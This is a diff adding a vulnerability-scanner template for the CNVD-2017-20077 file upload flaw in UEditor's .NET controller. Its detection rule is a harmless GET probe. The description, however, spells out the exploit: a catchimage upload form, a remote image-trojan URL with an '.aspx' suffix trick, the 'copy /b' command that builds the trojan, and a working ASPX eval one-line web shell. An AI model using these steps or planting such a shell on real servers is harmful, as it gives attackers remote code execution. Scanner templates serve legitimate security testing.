@@ -1,0 +1,26 @@
+id: CNVD-2017-20077
+
+info:
+  name: Ueditor编辑器.net版本存在文件上传漏洞
+  author: zan8in 
+  severity: critical
+  description: |
+    <form action="http://8.8.8.8:8001/ueditor/net/controller.ashx?action=catchimage" enctype="multipart/form-data" method="POST">
+    http://vps/11.jpg?.aspx 11.jpg是图片马；制作图片马：copy 1.jpg/b +2.aspx 3.aspx
+    aspx一句话：<%@ Page Language="Jscript"%><%eval(Request.Item["zan8in"],"unsafe");%>
+  reference:
+    - https://www.CNVD.org.cn/flaw/show/CNVD-2017-20077
+    - https://zhuanlan.zhihu.com/p/85265552
+    - https://www.freebuf.com/vuls/181814.html
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /ueditor/net/controller.ashx?action=catchimage&encode=utf-8
+      headers:
+        Accept-Encoding: 'deflate'
+      follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(string("没有指定抓取源")))
+expression: r0()
